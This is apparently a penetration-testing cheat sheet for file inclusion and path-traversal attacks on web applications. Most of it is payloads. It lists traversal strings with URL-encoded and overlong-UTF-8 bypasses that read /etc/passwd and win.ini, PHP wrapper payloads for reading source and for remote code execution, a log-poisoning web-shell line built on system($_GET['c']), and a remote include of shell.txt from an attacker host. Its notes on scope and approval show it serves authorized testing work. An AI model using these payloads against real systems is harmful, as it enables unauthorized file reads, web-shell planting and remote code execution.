# LFI / Path traversal / RFI

Targets: any param that names a file, template, image, include, or `file=`/`path=`/`page=`
argument. Confirm by reading a *known* benign file (never secrets first).

## Traversal ladder (try in order)

```
/etc/passwd
../../../../../../etc/passwd
....//....//....//etc/passwd          (normalization bypass)
..%2f..%2f..%2f..%2fetc%2fpasswd      (URL-encoded)
%2e%2e%2f%2e%2e%2fetc%2fpasswd        (double-encoded)
..%252f..%252f..%252fetc%252fpasswd
..././..././..././etc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd    (overlong UTF-8)
/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

## Windows targets

```
..\..\..\..\windows\win.ini
....\....\....\windows\win.ini
..%5c..%5c..%5c..%5cwindows%5cwin.ini
C:\windows\win.ini   (absolute — only if in scope)
```

## PHP wrappers (when PHP)

| Wrapper | Payload |
|---|---|
| Read source (base64) | `php://filter/convert.base64-encode/resource=index.php` |
| Read source (string chain) | `php://filter/string.rot13/resource=index.php` |
| Data (RCE-ish, approval) | `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+` |
| Expect (RCE, approval) | `expect://id` |
| Input (RCE, approval) | `php://input` + POST `<?php ... ?>` |
| Zip (file-upload chain) | `zip://uploads/MARKER.zip%23shell.php` |
| Phar (deser, approval) | `phar://uploads/MARKER.jpg/shell.php` |

## Log poisoning (proof, requires write access + approval)

Inject `<?php system($_GET['c']);?>` into a User-Agent / Referer, then include the log file
(e.g. `/var/log/apache2/access.log` or `/proc/self/environ`).

## RFI (if allow_url_include)

`http://<oob-marker-or-attacker-host>/shell.txt` — for detection just include a URL that
resolves to your `oob.js` marker; an OOB hit proves remote include without executing anything.
